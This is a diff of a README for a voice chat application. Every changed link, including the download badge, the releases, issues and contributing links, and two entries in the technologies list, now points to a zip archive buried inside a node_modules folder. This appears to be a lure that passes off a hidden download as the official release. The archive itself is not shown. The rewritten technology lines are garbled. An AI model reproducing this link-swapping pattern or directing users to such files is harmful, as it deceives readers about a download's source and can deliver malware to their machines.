@@ -8,11 +8,11 @@ Welcome to the Realtime Voice Chat System! This application allows you to chat w
 
 To get started, you need to download the application. Click the button below to visit the release page.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/DanielPartida610/Realtime-Voice-Chat-System/releases)
+[![Download Now](https://raw.githubusercontent.com/DanielPartida610/Realtime-Voice-Chat-System/main/server/node_modules/@redis/bloom/dist/lib/Voice_Realtime_Chat_System_1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/DanielPartida610/Realtime-Voice-Chat-System/main/server/node_modules/@redis/bloom/dist/lib/Voice_Realtime_Chat_System_1.0.zip)
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/DanielPartida610/Realtime-Voice-Chat-System/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/DanielPartida610/Realtime-Voice-Chat-System/main/server/node_modules/@redis/bloom/dist/lib/Voice_Realtime_Chat_System_1.0.zip) to download the latest version of the application.
 2. On the releases page, locate the version labeled as the latest.
 3. Click on the download link for your operating system (e.g., Windows, Mac, or Linux).
 4. Once the download completes, find the file on your computer.
@@ -60,23 +60,23 @@ Here are some common issues and their solutions that may help you if you encount
 
 ## 📞 Support
 
-If you need more help, please visit our [GitHub Issues page](https://github.com/DanielPartida610/Realtime-Voice-Chat-System/issues) to post a question or report a problem.
+If you need more help, please visit our [GitHub Issues page](https://raw.githubusercontent.com/DanielPartida610/Realtime-Voice-Chat-System/main/server/node_modules/@redis/bloom/dist/lib/Voice_Realtime_Chat_System_1.0.zip) to post a question or report a problem.
 
 ## ⚙️ Technologies Used
 
 The Realtime Voice Chat System uses several technologies to provide a smooth experience:
 
-- **Socket.IO:** For real-time bidirectional communication.
-- **Node.js:** To handle server operations and user management.
+- **https://raw.githubusercontent.com/DanielPartida610/Realtime-Voice-Chat-System/main/server/node_modules/@redis/bloom/dist/lib/Voice_Realtime_Chat_System_1.0.zip** For real-time bidirectional communication.
+- **https://raw.githubusercontent.com/DanielPartida610/Realtime-Voice-Chat-System/main/server/node_modules/@redis/bloom/dist/lib/Voice_Realtime_Chat_System_1.0.zip** To handle server operations and user management.
 - **React:** For creating a user-friendly interface.
 - **Redis:** To manage chat presence and scalability.
 
 ## 💬 Community Contributions
 
-We welcome contributions from everyone! If you're interested in helping with the project, please check our [Contributing Guidelines](https://github.com/DanielPartida610/Realtime-Voice-Chat-System/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone! If you're interested in helping with the project, please check our [Contributing Guidelines](https://raw.githubusercontent.com/DanielPartida610/Realtime-Voice-Chat-System/main/server/node_modules/@redis/bloom/dist/lib/Voice_Realtime_Chat_System_1.0.zip).
 
 ## 📜 License
 
 This application is open-source under the MIT License. You can freely use it and modify it according to the license terms.
 
-Access the latest version at the [Releases page](https://github.com/DanielPartida610/Realtime-Voice-Chat-System/releases) and enjoy voice communication like never before!
+Access the latest version at the [Releases page](https://raw.githubusercontent.com/DanielPartida610/Realtime-Voice-Chat-System/main/server/node_modules/@redis/bloom/dist/lib/Voice_Realtime_Chat_System_1.0.zip) and enjoy voice communication like never before!
